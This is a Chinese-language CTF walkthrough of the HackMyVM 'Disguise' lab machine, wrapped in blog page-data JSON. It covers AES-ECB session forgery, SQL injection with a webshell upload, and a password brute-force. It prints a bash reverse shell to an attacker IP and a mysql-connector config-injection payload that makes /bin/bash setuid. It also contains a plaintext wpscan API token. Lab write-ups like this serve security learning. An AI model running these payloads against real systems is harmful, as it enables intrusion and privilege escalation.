{"pageProps":{"postData":{"id":"HackMyVMDisguise","contentHtml":"<h1>Disguise.</h1>\n<blockquote>\n<p><a href=\"https://hackmyvm.eu/machines/machine.php?vm=Disguise\">https://hackmyvm.eu/machines/machine.php?vm=Disguise</a></p>\n</blockquote>\n<p>Notes：<strong>A machine that simulates a real environment, please be careful and have fun.</strong></p>\n<h2>前期踩点</h2>\n<pre><code class=\"hljs language-bash\">➜  Disguise nmap -sP 192.168.56.0/24                      \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-12 02:37 EDT\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.1\nHost is up (0.00050s latency).\nMAC Address: 0A:00:27:00:00:09 (Unknown)\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.2\nHost is up (0.00046s latency).\nMAC Address: 08:00:27:BD:06:66 (Oracle VirtualBox virtual NIC)\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.59\nHost is up (0.00078s latency).\nMAC Address: 08:00:27:34:29:FC (Oracle VirtualBox virtual NIC)\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.4\nHost is up.\nNmap <span class=\"hljs-keyword\">done</span>: 256 IP addresses (4 hosts up) scanned <span class=\"hljs-keyword\">in</span> 2.01 seconds\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜  Disguise nmap -sT -min-rate 10000 -p- 192.168.56.59    \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-12 02:37 EDT\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.59\nHost is up (0.0010s latency).\nNot shown: 65533 closed tcp ports (conn-refused)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\nMAC Address: 08:00:27:34:29:FC (Oracle VirtualBox virtual NIC)\n\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 4.38 seconds\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜  Disguise nmap -sT -A -T4 -O -p 22,80 192.168.56.59 \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-12 02:45 EDT\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.59\nHost is up (0.00082s latency).\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u4 (protocol 2.0)\n| ssh-hostkey: \n|   2048 93:a4:92:55:72:2b:9b:4a:52:66:5c:af:a9:83:3c:fd (RSA)\n|   256 1e:a7:44:0b:2c:1b:0d:77:83:<span class=\"hljs-built_in\">df</span>:1d:9f:0e:30:08:4d (ECDSA)\n|_  256 d0:fa:9d:76:77:42:6f:91:d3:bd:b5:44:72:a7:c9:71 (ED25519)\n80/tcp open  http    Apache httpd 2.4.59 ((Debian))\n|_http-generator: WordPress 6.7.2\n|_http-server-header: Apache/2.4.59 (Debian)\n|_http-title: Just a simple wordpress site\n| http-robots.txt: 1 disallowed entry \n|_/wp-admin/\nMAC Address: 08:00:27:34:29:FC (Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice <span class=\"hljs-built_in\">type</span>: general purpose\nRunning: Linux 4.X|5.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\nOS details: Linux 4.15 - 5.8\nNetwork Distance: 1 hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.82 ms 192.168.56.59\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 12.08 seconds\n</code></pre>\n<h2>Web 渗透</h2>\n<h3>WordPess</h3>\n<p>看到 <code>nmap</code> 版本探测中扫描出来了 <code>WordPress</code> ，那么就可以使用 <code>wpscan</code> 来针对性扫描了</p>\n<p>访问 Web 页面，提示 <code>Disguise.hmv</code> 添加到 <code>hosts</code> 中</p>\n<p>在页面信息中能得到一个用户 <code>simpleAdmin</code></p>\n<p><img src=\"/post-images/HackMyVMDisguise/image.png\" alt=\"image.png\"></p>\n<p>使用 <code>wpscan</code> 进行针对性扫描了</p>\n<pre><code class=\"hljs language-bash\">➜  Disguise wpscan --url disguise.hmv --api-token bOauzGNYvhy6BU3DlHGCMVZmWJDqZH5tuFoHfsdk91o -e u,ap --plugins-detection mixed\n_______________________________________________________________\n         __          _______   _____\n         \\ \\        / /  __ \\ / ____|\n          \\ \\  /\\  / /| |__) | (___   ___  __ _ _ __ ®\n           \\ \\/  \\/ / |  ___/ \\___ \\ / __|/ _` |  _ \\\n            \\  /\\  /  | |     ____) | (__| (_| | | | |\n             \\/  \\/   |_|    |_____/ \\___|\\__,_|_| |_|\n\n         WordPress Security Scanner by the WPScan Team\n                         Version 3.8.27\n       Sponsored by Automattic - https://automattic.com/\n       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart\n_______________________________________________________________\n\n[+] URL: http://disguise.hmv/ [192.168.56.59]\n[+] Started: Mon May 12 03:25:17 2025\nInteresting Finding(s):\n\n[+] Headers\n | Interesting Entry: Server: Apache/2.4.59 (Debian)\n | Found By: Headers (Passive Detection)\n | Confidence: 100%\n\n[+] robots.txt found: http://disguise.hmv/robots.txt\n | Interesting Entries:\n |  - /wp-admin/\n |  - /wp-admin/admin-ajax.php\n | Found By: Robots Txt (Aggressive Detection)\n | Confidence: 100%\n\n[+] XML-RPC seems to be enabled: http://disguise.hmv/xmlrpc.php\n | Found By: Direct Access (Aggressive Detection)\n | Confidence: 100%\n | References:\n |  - http://codex.wordpress.org/XML-RPC_Pingback_API\n |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/\n |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/\n |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/\n |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/\n\n[+] WordPress readme found: http://disguise.hmv/readme.html\n | Found By: Direct Access (Aggressive Detection)\n | Confidence: 100%\n\n[+] Upload directory has listing enabled: http://disguise.hmv/wp-content/uploads/\n | Found By: Direct Access (Aggressive Detection)\n | Confidence: 100%\n\n[+] The external WP-Cron seems to be enabled: http://disguise.hmv/wp-cron.php\n | Found By: Direct Access (Aggressive Detection)\n | Confidence: 60%\n | References:\n |  - https://www.iplocation.net/defend-wordpress-from-ddos\n |  - https://github.com/wpscanteam/wpscan/issues/1299\n\n[+] WordPress version 6.7.2 identified (Outdated, released on 2025-02-11).\n | Found By: Rss Generator (Passive Detection)\n |  - http://disguise.hmv/feed/, &#x3C;generator>https://wordpress.org/?v=6.7.2&#x3C;/generator>\n |  - http://disguise.hmv/comments/feed/, &#x3C;generator>https://wordpress.org/?v=6.7.2&#x3C;/generator>\n\n[+] WordPress theme <span class=\"hljs-keyword\">in</span> use: newscrunch\n | Location: http://disguise.hmv/wp-content/themes/newscrunch/\n | Last Updated: 2025-05-07T00:00:00.000Z\n | Readme: http://disguise.hmv/wp-content/themes/newscrunch/readme.txt\n | [!] The version is out of <span class=\"hljs-built_in\">date</span>, the latest version is 1.8.5\n | Style URL: http://disguise.hmv/wp-content/themes/newscrunch/style.css?ver=6.7.2\n | Style Name: Newscrunch\n | Style URI: https://spicethemes.com/newscrunch\n | Description: Newscrunch is a magazine and blog theme. It is a lightweight, elegant, and fully responsive theme sp...\n | Author: spicethemes\n | Author URI: https://spicethemes.com\n |\n | Found By: Css Style In Homepage (Passive Detection)\n | Confirmed By: Css Style In 404 Page (Passive Detection)\n |\n | Version: 1.8.4.2 (80% confidence)\n | Found By: Style (Passive Detection)\n |  - http://disguise.hmv/wp-content/themes/newscrunch/style.css?ver=6.7.2, Match: Version: 1.8.4.2<span class=\"hljs-string\">'\n\n[+] Enumerating All Plugins (via Passive and Aggressive Methods)\n Checking Known Locations - Time: 00:43:31 &#x3C;==================> (110475 / 110475) 100.00% Time: 00:43:31[+] Checking Plugin Versions (via Passive and Aggressive Methods)                   > (44160 / 110475) 39.97%  ETA: 00:24:36\n[i] Plugin(s) Identified:\n\n[+] akismet\n | Location: http://disguise.hmv/wp-content/plugins/akismet/\n | Latest Version: 5.4\n | Last Updated: 2025-05-07T16:30:00.000Z\n |\n | Found By: Known Locations (Aggressive Detection)\n |  - http://disguise.hmv/wp-content/plugins/akismet/, status: 403\n |\n | [!] 1 vulnerability identified:\n |\n | [!] Title: Akismet 2.5.0-3.1.4 - Unauthenticated Stored Cross-Site Scripting (XSS)\n |     Fixed in: 3.1.5\n |     References:\n |      - https://wpscan.com/vulnerability/1a2f3094-5970-4251-9ed0-ec595a0cd26c\n |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-9357\n |      - http://blog.akismet.com/2015/10/13/akismet-3-1-5-wordpress/\n |      - https://blog.sucuri.net/2015/10/security-advisory-stored-xss-in-akismet-wordpress-plugin.html\n |\n\n....\n</span></code></pre>\n<p>可以看到 <code>WordPress</code> 版本还是比较新的，而且插件也没有扫描出来漏洞</p>\n<p>再对上面的到的用户名进行爆破，密码使用 <code>rockyou</code> 到 <code>5000</code> 我就停了，也，没爆破出来</p>\n<p><img src=\"/post-images/HackMyVMDisguise/image1.png\" alt=\"image.png\"></p>\n<h3>模糊测试</h3>\n<p>再扫描一下子域名</p>\n<pre><code class=\"hljs language-bash\">➜  Disguise wfuzz -c -w ../../Dict/SecLists-2024.3/Discovery/DNS/subdomains-top1million-110000.txt -u http://disguise.hmv -H <span class=\"hljs-string\">'host:FUZZ.disguise.hmv'</span> --hl=890\n********************************************************\n* Wfuzz 3.1.0 - The Web Fuzzer                         *\n********************************************************\n\nTarget: http://disguise.hmv/\nTotal requests: 114441\n\n=====================================================================\nID           Response   Lines    Word       Chars       Payload                                                   \n=====================================================================\n\n000000001:   301        0 L      0 W        0 Ch        <span class=\"hljs-string\">\"www\"</span>                                               \n000005051:   200        18 L     52 W       846 Ch      <span class=\"hljs-string\">\"dark\"</span>                              \n</code></pre>\n<p>得到新的子域名 <code>dark</code> 添加到 <code>hosts</code> ，再访问</p>\n<p><img src=\"/post-images/HackMyVMDisguise/image2.png\" alt=\"image.png\"></p>\n<p>可以进行注注册，注册用户 <code>help</code> 然后登陆进去</p>\n<p><img src=\"/post-images/HackMyVMDisguise/image3.png\" alt=\"image.png\"></p>\n<h3>伪造 Session</h3>\n<p>这部分看着WP和自己理解做的（实在不懂密码学）</p>\n<p>被动拦截的包中有一个特别的字段 <code>dark_session</code></p>\n<p><img src=\"/post-images/HackMyVMDisguise/image4.png\" alt=\"image.png\"></p>\n<p>将其进行 URL 解码后是一串 <code>base64</code> ，再继续解码出来感觉怪怪的</p>\n<p><img src=\"/post-images/HackMyVMDisguise/image5.png\" alt=\"image.png\"></p>\n<p>多注册几个用户查看是否存在构造的可能（注册时用户名超过<code>8</code>个会被阻止，但是它是前端验证，绕过即可）同时发现 <code>simpleAdmin</code> 被注册了，可能就是要伪造它。</p>\n<pre><code class=\"hljs language-bash\">// a bxgIMpx0LFnwYPwx7tl37A== 1\n// aaaa e3Opvt7372tUQCmdavBBxA== 4\n// aaaaaaaa 5SKl5Bbstz3e0GrQ8QBCkA== 8\n// aaaaaaaaaa Hxs4O2FVu/QM9EqHsnvrOA== 10\n// aaaaaaaaaaaa FUoxH12UY/N58pkbRNAAf8JwkfrsOdSxW16pbszGJLY= 12\n// aaaaaaaaaaaaaaaaaaaaaaaa FUoxH12UY/N58pkbRNAAf7p+nJP55MNIxlkje3zIK2M= 24\n// aaaaaaaaaaaaaaaaaaaaaaaaaaaa FUoxH12UY%2FN58pkbRNAAf0Kfd1bvz3G39ZMOl2HnjTHCcJH67DnUsVteqW7MxiS2 28\n// aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa FUoxH12UY/N58pkbRNAAf0Kfd1bvz3G39ZMOl2HnjTEN1ZCFIDLOwYyKBoSxyL6x 32\n</code></pre>\n<p>可以注意到在 <code>12</code> 位后用户名生成的 <code>Session</code> 前半部分是一样的，我们把它拿去喂给 <code>GPT</code></p>\n<p><img src=\"/post-images/HackMyVMDisguise/image6.png\" alt=\"image.png\"></p>\n<p>推断出来是 <code>AES</code> 加密，采用 <code>PKCS#7</code> 填充：<a href=\"https://segmentfault.com/a/1190000019793040\">https://segmentfault.com/a/1190000019793040</a></p>\n<p>并且看加密后的值比较的话，应该是<code>AES-128</code> （通过群友得知加密算法是<code>AES-128-ecb</code>）</p>\n<blockquote>\n<p><code>AES-128-ECB</code>（Electronic Codebook）是AES对称加密算法的一种基础工作模式。其核心特点是将明文分成固定大小的块（128位/16字节），每个块<strong>独立加密</strong>，加密过程无需依赖其他数据块\n<strong>密钥长度</strong>：固定为128位（16字节），如密钥不足会通过补零或截断处理\n<strong>填充规则</strong>：若明文长度不足16字节的整数倍，需填充至对齐。常用 PKCS#7 填充（例如，缺5字节则填充5个<code>0x05</code>）\n<strong>加密流程</strong>：每16字节明文块直接通过AES算法加密，生成16字节密文块，最终拼接为完整密文</p>\n</blockquote>\n<p>那么一个加密块是<code>16</code>字节，<code>simpleAdmin</code>是<code>11</code>字节，后边就要补充<code>4</code>个<code>0x04</code></p>\n<pre><code class=\"hljs language-bash\">aaaaaaaaaaaa\\x04\\x04\\x04\\x04\n</code></pre>\n<p>但是我们可以注意到我们输入了 <code>12</code>个字节和<code>28</code>个字节时 ，密文就翻倍了</p>\n<pre><code class=\"hljs language-bash\">// aaaaaaaa 5SKl5Bbstz3e0GrQ8QBCkA== 8\n// aaaaaaaaaaaa FUoxH12UY/N58pkbRNAAf8JwkfrsOdSxW16pbszGJLY= 12\n// aaaaaaaaaaaaaaaaaaaaaaaaaaaa FUoxH12UY%2FN58pkbRNAAf0Kfd1bvz3G39ZMOl2HnjTHCcJH67DnUsVteqW7MxiS2 28\n</code></pre>\n<p>那么一个块是16字节，为什么12就翻倍了呢？</p>\n<p>那么就是可能加了<code>salt</code></p>\n<pre><code class=\"hljs language-bash\">// aaaaaaaa(8) + salt(4) + /x04/x04/x04/x04 5SKl5Bbstz3e0GrQ8QBCkA== 8\n// aaaaaaaaaaaa(12) + salt(4) + &#x3C;填充一个数据块> FUoxH12UY/N58pkbRNAAf8JwkfrsOdSxW16pbszGJLY= 12\n// aaaaaaaaaaa(11) + salt(4) + /x01\n// aaaaaaaaaaaaaaaaaaaaaaaaaaaa(28) + salt(4) + &#x3C;填充一个数据块> FUoxH12UY%2FN58pkbRNAAf0Kfd1bvz3G39ZMOl2HnjTHCcJH67DnUsVteqW7MxiS2 28\n</code></pre>\n<p>然后我们要构造 <code>simpleAdmin</code></p>\n<pre><code class=\"hljs language-bash\">simpleAdmin(11) + salt(4) = 15\n</code></pre>\n<p>然后我们给它填满到<code>16</code>，让其多填充一个数据块</p>\n<pre><code class=\"hljs language-bash\">simpleAdmin(11) + salt(4) + /x01 = 16 + &#x3C;填充一个数据块>\n</code></pre>\n<p>然后就能泄露 <code>simpleAdmin</code> 的<code>Session</code>值</p>\n<p>注册<code>simpleAdmin%01</code></p>\n<p><img src=\"/post-images/HackMyVMDisguise/image7.png\" alt=\"image.png\"></p>\n<p>登录<code>simpleAdmin%01</code> 后抓到包</p>\n<p><img src=\"/post-images/HackMyVMDisguise/image8.png\" alt=\"image.png\"></p>\n<pre><code class=\"hljs language-bash\">+1+3/NxCLcIR0Jq9qDudF8JwkfrsOdSxW16pbszGJLY=\n</code></pre>\n<p><img src=\"/post-images/HackMyVMDisguise/image9.png\" alt=\"image.png\"></p>\n<p>取前面 <code>16</code> 个字节进行 base64 加密 和 URL编码</p>\n<p><img src=\"/post-images/HackMyVMDisguise/image10.png\" alt=\"image.png\"></p>\n<pre><code class=\"hljs language-bash\">%2B1%2B3%2FNxCLcIR0Jq9qDudFw%3D%3D\n</code></pre>\n<p>我们回到浏览器刷新 <code>profile.php</code>页面，更换 <code>dark_session</code></p>\n<p><img src=\"/post-images/HackMyVMDisguise/image11.png\" alt=\"image.png\"></p>\n<p>成功进来到 <code>simpleAdmin</code> 的后台</p>\n<p><img src=\"/post-images/HackMyVMDisguise/image12.png\" alt=\"image.png\"></p>\n<p>点击管理后台 ，有添加商品窗口</p>\n<p><img src=\"/post-images/HackMyVMDisguise/image13.png\" alt=\"image.png\"></p>\n<h3>文件上传 &#x26; SQL 注入</h3>\n<p>看样子可以上传图片</p>\n<p><img src=\"/post-images/HackMyVMDisguise/image14.png\" alt=\"image.png\"></p>\n<p>常规操作，上传一张普通图片，在图片内容添加上 <code>phpinfo</code> ，然后发送</p>\n<p><img src=\"/post-images/HackMyVMDisguise/image15.png\" alt=\"image.png\"></p>\n<p>但是并没有找到图片的路径，主页上图片点开貌似是通过文件包含的，经过测试，没找到漏洞</p>\n<p><img src=\"/post-images/HackMyVMDisguise/image16.png\" alt=\"image.png\"></p>\n<p>测试一下其他参数，在文件名的部分加上单引号发现存在<code>SQL</code>注入</p>\n<p><img src=\"/post-images/HackMyVMDisguise/image17.png\" alt=\"image.png\"></p>\n<p>并且将文件路径爆了出来，访问一下</p>\n<p><img src=\"/post-images/HackMyVMDisguise/image18.png\" alt=\"image.png\"></p>\n<p>可以成功解析，上传一句话木马</p>\n<p><img src=\"/post-images/HackMyVMDisguise/image19.png\" alt=\"image.png\"></p>\n<p><img src=\"/post-images/HackMyVMDisguise/image20.png\" alt=\"image.png\"></p>\n<p>反弹 <code>Shell</code></p>\n<pre><code class=\"hljs language-bash\">1=system(<span class=\"hljs-string\">'%2Fbin%2Fbash+-c+%22bash+-i+%3E%26+%2Fdev%2Ftcp%2F192.168.56.4%2F1234+0%3E%261%22'</span>);\n</code></pre>\n<p><img src=\"/post-images/HackMyVMDisguise/image21.png\" alt=\"image.png\"></p>\n<h2>提权 - To Darksoul</h2>\n<h3>信息收集</h3>\n<p>拿到 shell 先将其进行升级为交互式的：<a href=\"https://sunsetaction.top/2025/04/21/%E5%8F%8D%E5%BC%B9%20shell%20%E5%8D%87%E7%BA%A7/\">https://sunsetaction.top/2025/04/21/%E5%8F%8D%E5%BC%B9%20shell%20%E5%8D%87%E7%BA%A7/</a></p>\n<p>查看一下 <code>config</code> 文件，后面三位是被遮住的</p>\n<pre><code class=\"hljs language-bash\">www-data@disguise:/var/www/dark$ <span class=\"hljs-built_in\">cat</span> config.php \n&#x3C;?php\n\n<span class=\"hljs-variable\">$DB_USER</span> = <span class=\"hljs-string\">'dark_db_admin'</span>;\n<span class=\"hljs-variable\">$DB_PASS</span> = <span class=\"hljs-string\">'Str0ngPassw0d1***'</span>;\n<span class=\"hljs-variable\">$DB_NAME</span> = <span class=\"hljs-string\">'dark_shop'</span>;\n\n?>\n</code></pre>\n<pre><code class=\"hljs language-bash\">www-data@disguise:/var/www/dark$ ss -tulpn\nNetid                     State                      Recv-Q                     Send-Q                                           Local Address:Port                                           Peer Address:Port\nudp                       UNCONN                     0                          0                                                      0.0.0.0:68                                                  0.0.0.0:*\ntcp                       LISTEN                     0                          80                                                   127.0.0.1:3306                                                0.0.0.0:*\ntcp                       LISTEN                     0                          128                                                    0.0.0.0:22                                                  0.0.0.0:*\ntcp                       LISTEN                     0                          128                                                          *:80                                                        *:*\ntcp                       LISTEN                     0                          128                                                       [::]:22                                                     [::]:* \n</code></pre>\n<p>在 <code>darksoul</code> 家目录也能找到</p>\n<pre><code class=\"hljs language-bash\">www-data@disguise:/home/darksoul$ <span class=\"hljs-built_in\">cat</span> config.ini \n[client]\nuser = dark_db_admin\npassword = Str0ngPassw0d1***\nhost = localhost\ndatabase = dark_shop\nport = int(3306)\n</code></pre>\n<h3>密码爆破</h3>\n<p>首先生成密码，后面三位可能是一致的</p>\n<pre><code class=\"hljs language-bash\">www-data@disguise:/home/darksoul$ <span class=\"hljs-built_in\">which</span> python\n/usr/bin/python\n</code></pre>\n<p>列出所有可用字符</p>\n<pre><code class=\"hljs language-bash\">ww-data@disguise:/home/darksoul$ python\nPython 2.7.16 (default, Mar 23 2024, 18:55:36) \n[GCC 8.3.0] on linux2\nType <span class=\"hljs-string\">\"help\"</span>, <span class=\"hljs-string\">\"copyright\"</span>, <span class=\"hljs-string\">\"credits\"</span> or <span class=\"hljs-string\">\"license\"</span> <span class=\"hljs-keyword\">for</span> more information.\n>>> import string\n>>> <span class=\"hljs-built_in\">print</span>(string.printable)\n0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!<span class=\"hljs-string\">\"#$%&#x26;'()*+,-./:;&#x3C;=>?@[\\]^_`{|}~ \n</span></code></pre>\n<p>写脚本生成字典</p>\n<pre><code class=\"hljs language-bash\">def generate_password_dict():\n    prefix = <span class=\"hljs-string\">\"Str0ngPassw0d1\"</span>\n    \n    chars = r<span class=\"hljs-string\">\"\"</span><span class=\"hljs-string\">\"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\"</span>#$%&#x26;<span class=\"hljs-string\">'()*+,-./:;&#x3C;=>?@[\\]^_`{|}~\"\"\"\n    \n    with open(\"passwords.txt\", \"w\") as f:\n        for char in chars:\n            password = prefix + char*3 + \"\\n\"\n            f.write(password)\n\nif __name__ == \"__main__\":\n    generate_password_dict()\n</span></code></pre>\n<p>使用 <code>suForce</code> 进行爆破</p>\n<p><img src=\"/post-images/HackMyVMDisguise/image22.png\" alt=\"image.png\"></p>\n<h2>提权 - To Root</h2>\n<h3>信息收集</h3>\n<p>加目录下能发现<code>user.txt</code>..?</p>\n<pre><code class=\"hljs language-bash\">darksoul@disguise:~$ <span class=\"hljs-built_in\">cat</span> user.txt \nGood good study &#x26; Day day up,but <span class=\"hljs-built_in\">where</span> is the flag?\n</code></pre>\n<p>尝试寻找一下，找到 <code>hmv{hiddenflag}</code> ，被隐藏在 user.txt 里面</p>\n<pre><code class=\"hljs language-bash\">darksoul@disguise:~$ grep -rE <span class=\"hljs-string\">'flag'</span> ./ 2>/dev/null\n./user.txt:Good good study &#x26; Day day up,but <span class=\"hljs-built_in\">where</span> is the flag?\n./user.txt:hmv{hiddenflag}\n</code></pre>\n<p>实际上使用 <code>xxd</code> 也可以看到</p>\n<p><img src=\"/post-images/HackMyVMDisguise/image23.png\" alt=\"image.png\"></p>\n<p>上传 <code>pspy64</code> 查看进程</p>\n<pre><code class=\"hljs language-bash\">2025/05/13 03:12:32 CMD: UID=0     PID=1      | /sbin/init splash \n2025/05/13 03:13:01 CMD: UID=0     PID=1884   | /usr/sbin/CRON -f \n2025/05/13 03:13:01 CMD: UID=0     PID=1885   | /usr/sbin/CRON -f \n2025/05/13 03:13:02 CMD: UID=0     PID=1886   | /usr/bin/python3 /opt/query.py /home/darksoul/config.ini \n2025/05/13 03:13:02 CMD: UID=0     PID=1887   | /usr/bin/python3 /opt/query.py /home/darksoul/config.ini \n2025/05/13 03:13:02 CMD: UID=0     PID=1888   | /bin/sh -c <span class=\"hljs-built_in\">uname</span> -p 2> /dev/null \n</code></pre>\n<p>能看到一段时间就运行 <code>python</code> 脚本</p>\n<pre><code class=\"hljs language-bash\">darksoul@disguise:~$ <span class=\"hljs-built_in\">ls</span> -al /opt/query.py \n-rw-r--r-- 1 root root 870 Apr  1 09:56 /opt/query.py\ndarksoul@disguise:~$ <span class=\"hljs-built_in\">cat</span> /opt/query.py \nimport mysql.connector\nimport sys\n\ndef main():\n    <span class=\"hljs-keyword\">if</span> len(sys.argv) != 2:\n        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Usage: python query.py &#x3C;configfile>\"</span>)\n        sys.exit(1)\n\n    cnf = sys.argv[1]\n\n    try:\n        conn = mysql.connector.connect(read_default_file=cnf)\n        cursor = conn.cursor()\n\n        query = <span class=\"hljs-string\">'SELECT COUNT(*) FROM users'</span>\n        cursor.execute(query)\n        results = cursor.fetchall()\n        <span class=\"hljs-built_in\">print</span>(f<span class=\"hljs-string\">\"users count:{results[0][0]}\"</span>)\n\n        query = <span class=\"hljs-string\">'SELECT COUNT(*) FROM products'</span>\n        cursor.execute(query)\n        results = cursor.fetchall()\n        <span class=\"hljs-built_in\">print</span>(f<span class=\"hljs-string\">\"products count:{results[0][0]}\"</span>)\n    except mysql.connector.Error as err:\n        <span class=\"hljs-built_in\">print</span>(f<span class=\"hljs-string\">\"db connect error: {err}\"</span>)\n    finally:\n        <span class=\"hljs-keyword\">if</span> <span class=\"hljs-string\">'cursor'</span> <span class=\"hljs-keyword\">in</span> locals():\n            cursor.close()\n        <span class=\"hljs-keyword\">if</span> <span class=\"hljs-string\">'conn'</span> <span class=\"hljs-keyword\">in</span> locals() and conn.is_connected():\n            conn.close()\n\n<span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">\"__main__\"</span>:\n    main()\n</code></pre>\n<p>通过<code>read_default_file=cnf</code>参数从指定路径的MySQL配置文件中读取连接参数</p>\n<p>执行<code>SELECT COUNT(*)</code>查询用户表和产品表的记录总数，结果通过<code>fetchall()</code>获取</p>\n<p>使用<code>print</code>直接输出统计值，符合简单计数场景需求</p>\n<p>在<code>finally</code>块中显式关闭游标和连接，防止资源泄漏</p>\n<h3>python.connector</h3>\n<p><code>/opt</code> 无法写入，模块也都是只读，但是<code>config.ini</code>我们是可控的</p>\n<p>查看一下官方文档：<a href=\"https://dev.mysql.com/doc/connector-python/en/\">https://dev.mysql.com/doc/connector-python/en/</a></p>\n<p>在：<a href=\"https://dev.mysql.com/doc/connector-python/en/connector-python-opentelemetry.html\">https://dev.mysql.com/doc/connector-python/en/connector-python-opentelemetry.html</a> 中，可以找到配置文件中有如下代码：</p>\n<p><img src=\"/post-images/HackMyVMDisguise/image24.png\" alt=\"image.png\"></p>\n<p>配置文件中可以执行<code>py</code>语句，我们看一下<code>config</code> 的连接参数：<a href=\"https://dev.mysql.com/doc/connector-python/en/connector-python-connectargs.html\">https://dev.mysql.com/doc/connector-python/en/connector-python-connectargs.html</a></p>\n<p>但是也并没有找到可利用的方法</p>\n<p>最后在 微信 搜一搜找到了：<a href=\"https://mp.weixin.qq.com/s/h3qOUrzhANfDJ0PuAJyc6w%EF%BC%88%E8%BF%99%E6%96%87%E7%AB%A0%E4%B9%8B%E5%89%8D%E8%BF%98%E7%9C%8B%E8%BF%87%EF%BC%8C%E7%84%B6%E5%90%8E%E5%BF%98%E8%AE%B0%E4%BA%86..%EF%BC%89\">https://mp.weixin.qq.com/s/h3qOUrzhANfDJ0PuAJyc6w（这文章之前还看过，然后忘记了..）</a></p>\n<pre><code class=\"hljs language-bash\">// POC\n[incorrect_config]\nuser=root\npassword=mypass\ndatabase=cpydata\nport=int(3306)\nallow_local_infile=__import__(<span class=\"hljs-string\">'os'</span>).system(<span class=\"hljs-string\">'calc'</span>)\n</code></pre>\n<pre><code class=\"hljs language-bash\">[client]\nuser = dark_db_admin\npassword = Str0ngPassw0d1***\nhost = localhost\ndatabase = dark_shop\nport = int(3306)\nallow_local_infile=__import__(<span class=\"hljs-string\">'os'</span>).system(<span class=\"hljs-string\">'chmod u+s /bin/bash'</span>)\n</code></pre>\n<p>获取 <code>root shell</code></p>\n<pre><code class=\"hljs language-bash\">darksoul@disguise:~$ <span class=\"hljs-built_in\">ls</span> -al /bin/bash\n-rwsr-xr-x 1 root root 1168776 Apr 18  2019 /bin/bash\ndarksoul@disguise:~$ /bin/bash -p\nbash-5.0# \n</code></pre>\n<pre><code class=\"hljs language-bash\">bash-5.0# <span class=\"hljs-built_in\">cat</span> root.txt \n<span class=\"hljs-comment\">#Congratulations!!!</span>\nhmv{CVE-2025-21548}\n</code></pre>\n<h2>总结</h2>\n<p>涉及到密码学，通过<code>AES-128-ECB</code>的局限性来伪造 Session，这一部分算是知识盲区了。</p>\n<p><img src=\"/post-images/HackMyVMDisguise/EDM-3x.gif\" alt=\"EDM-3x.gif\"></p>","title":"HackMyVM - Disguise","date":"2025-05-13","updated":"2025-05-13","tags":["HackMyVM","Linux靶机","Crypto","AES","Brute","Mysql","Hidden"],"categories":"靶机","comments":true,"description":"Disguise.\n\n https://hackmyvm.eu/machines/machine.php?vm=Disguise\n \n\nNotes：A machine that simulates a real environment, please be careful and have fun.\n\n前期踩点\n\n\n\n\n\n\n\nWeb 渗透\n\nWordPess\n\n看到 `nmap` 版本探测中扫描出..."},"recentPosts":[{"id":"TheHackersLabsElevator","title":"TheHackersLabs - Elevator","date":"2025-09-29","isEncrypted":false,"year":"2025","month":"09","day":"29"},{"id":"TheHackersLabsPa Que Aiga Lujo","title":"TheHackersLabs - Pa Que Aiga Lujo","date":"2025-09-28","isEncrypted":false,"year":"2025","month":"09","day":"28"},{"id":"HackMyVMSilentdev","title":"HackMyVM - Silentdev","date":"2025-09-26","isEncrypted":false,"year":"2025","month":"09","day":"26"},{"id":"TheHackersLabsFolclore","title":"TheHackersLabs - Folclore","date":"2025-09-24","isEncrypted":false,"year":"2025","month":"09","day":"24"},{"id":"HackMyVMAria","title":"HackMyVM - Aria","date":"2025-09-23","isEncrypted":false,"year":"2025","month":"09","day":"23"},{"id":"HackTheBoxSeason9 - Expressway","title":"HackTheBox - Season9 - Expressway","date":"2025-09-21","isEncrypted":true,"year":"2025","month":"09","day":"21"},{"id":"HackTheBoxSeason8 - Fluffy","title":"HackTheBox - Machine - Fluffy","date":"2025-05-25","isEncrypted":false,"year":"2025","month":"09","day":"20"}]},"__N_SSG":true}